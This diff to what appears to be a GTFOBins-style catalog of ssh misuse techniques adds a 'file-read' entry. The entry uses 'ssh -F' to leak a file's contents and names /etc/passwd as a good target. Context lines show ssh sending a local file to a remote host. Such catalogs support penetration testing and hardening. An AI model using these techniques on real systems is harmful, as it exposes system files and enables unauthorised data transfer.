@@ -17,4 +17,9 @@ functions:
         RPATH=where_to_save
         LPATH=file_to_send
         ssh $HOST "cat > $RPATH" < $LPATH
+  file-read:
+    - description: Read strings from text files. Reliability depends on content of files but works well with /etc/passwd
+    - code: |
+        LFILE=file_to_read    
+        ssh -F $LFILE localhost
 ---
